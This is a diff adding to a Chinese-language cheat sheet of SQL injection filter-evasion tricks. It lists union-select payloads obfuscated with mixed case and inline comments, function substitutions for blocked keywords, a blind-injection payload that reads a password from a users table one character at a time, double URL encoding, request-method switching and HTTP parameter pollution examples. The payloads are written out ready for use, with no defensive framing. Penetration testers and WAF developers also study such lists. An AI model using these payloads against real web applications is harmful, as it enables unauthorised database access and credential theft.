@@ -70,3 +70,39 @@ id=-1'/!UnIoN/ SeLeCT 1,2,concat(/!table_name/) FrOM /information_schema/.tables
 id=-1'UNIunionONSeLselectECT1,2,3–-
 
 
+等价替换
+hex()、bin() ==> ascii()
+sleep() ==>benchmark()
+concat_ws()==>group_concat()
+mid()、substr() ==> substring()
+@@user ==> user()
+@@datadir ==> datadir()
+举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　
+或者：
+substr((select 'password'),1,1) = 0x70
+strcmp(left('password',1), 0x69) = 1
+strcmp(left('password',1), 0x70) = 0
+strcmp(left('password',1), 0x71) = -1
+
+参数污染
+?id=1&id=2&id=3
+
+编码解码及加密解密
+s->%73->%25%37%33
+
+hex,unlcode,base64等
+
+更改请求提交方式
+尝试更改Get请求为Post请求
+
+GET POST COOKIE等
+
+POST->multipart/form-data
+
+中间件HPP(HTTP参数污染)
+
+http://www.test.com/index.asp?page=select 1,2,3 from table where id=1
+http://www.test.com/index.asp?page=select 1&page=2,3 from table where id=1
+
+HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color=red&color=blue为例
+
